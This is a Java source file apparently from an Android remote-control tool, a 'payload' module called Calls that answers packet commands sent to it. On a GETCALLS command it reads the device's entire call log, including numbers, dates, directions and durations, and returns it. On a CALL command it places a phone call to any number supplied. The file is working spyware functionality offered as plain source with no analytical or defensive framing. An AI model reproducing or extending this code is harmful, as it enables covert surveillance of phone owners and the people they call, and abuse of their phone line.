package com.core.payloads;

import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import com.corelib.IPayload;
import com.corelib.Packet;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

/**
 * Calls class
 * Created by hkff on 4/22/15.
 */
public class Calls implements IPayload {

    //-----------------------------------------------------------//
    public enum Commands {
        CALL,
        GETCALLS,
    }

    @Override
    public String man() {
        return "";
    }

    /***
     * Handle msg
     * @param msg
     * @return
     */
    @Override
    public Packet handle(Packet msg) {
        // The result to return
        Packet result = new Packet("NO_COMMAND_PROVIDED", Packet.Type.STRING);

        // Get the command (and convert it to uppercase)
        String cmd0 = msg.getMsg().toUpperCase();

        // Check if the command exists in our Commands enumeration
        Commands cmd;
        try{
            cmd = Commands.valueOf(cmd0);
        } catch (IllegalArgumentException e){
            // If there is no command, we return an error message
            result.setType(Packet.Type.NONE);
            return result;
        }

        // Parse args
        String[] tmp = new String(msg.getContent()).split(":");

        // We handle the command
        switch (cmd){
            // call
            // Protocol : CALL:phone_num
            case CALL:
                // Get argument
                String num2 = (tmp.length > 0)? tmp[0] : "";

                if(!num2.isEmpty()){
                    // We send our sms
                    this.call(num2);
                    // We set the result
                    result.setMsg("Calling ...");
                }else{
                    // No num provided
                    result.setMsg("No phone number provided !");
                }
                break;

            // Get calls
            // Protocol : GETCALLS
            case GETCALLS:
                result.setMsg(this.getCalls());
                break;
        }

        return result;
    }
    //-----------------------------------------------------------//

    /**
     * call Packet class
     */
    class PacketCall {
        private String num;
        private String type;
        private Date date;
        private String duration;

        public PacketCall() {}

        public PacketCall(String num, String type, Date date, String duration) {
            this.num = num;
            this.type = type;
            this.date = date;
            this.duration = duration;
        }

        public String toString() {
            DateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
            return "" +
                    " - Num : " + this.num +
                    " - Date :  " + df.format(this.date) +
                    " - Type : " + this.type +
                    " - Duration : " + this.duration;
        }
    }


    // Attributes
    public Activity app;

    @Override
    public void setApp(Activity app) {
        this.app = app;
    }

    public Calls(){}

    /**
     * Constructor
     * @param app
     */
    public Calls(Activity app){
        this.app = app;
    }


    /**
     * call a number
     * @param num
     */
    public void call(String num) {
        String uri = "tel:" + num.trim() ;
        Intent intent = new Intent(Intent.ACTION_CALL);
        intent.setData(Uri.parse(uri));
        app.startActivity(intent);
    }

    /**
     * Get all calls
     * @return
     */
    public String getCalls() {
        String result = "";
        ArrayList<PacketCall> l = new ArrayList<>();
        String WHERE_CONDITION = "";
        String SORT_ORDER = "date DESC";
        String[] column = null;
        Uri CONTENT_URI = CallLog.Calls.CONTENT_URI;

        Cursor cursor = app.getContentResolver().query(CONTENT_URI, column , WHERE_CONDITION, null, SORT_ORDER);
        if(cursor.getCount() != 0) {
            cursor.moveToFirst();

            do{
                if(cursor.getColumnCount() != 0) {
                    String num = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    String callDate = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                    Date date = new Date(Long.valueOf(callDate));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    String dir = null;
                    int dircode = Integer.parseInt(type);
                    switch( dircode ) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            dir = "OUTGOING";
                            break;

                        case CallLog.Calls.INCOMING_TYPE:
                            dir = "INCOMING";
                            break;

                        case CallLog.Calls.MISSED_TYPE:
                            dir = "MISSED";
                            break;
                    }

                    l.add(new PacketCall(num, dir, date, duration));
                }
            } while(cursor.moveToNext());
        }
        cursor.close();

        // Convert the list to string
        for(PacketCall call: l){
            result += "\n" + call.toString();
        }

        return result;
    }
}

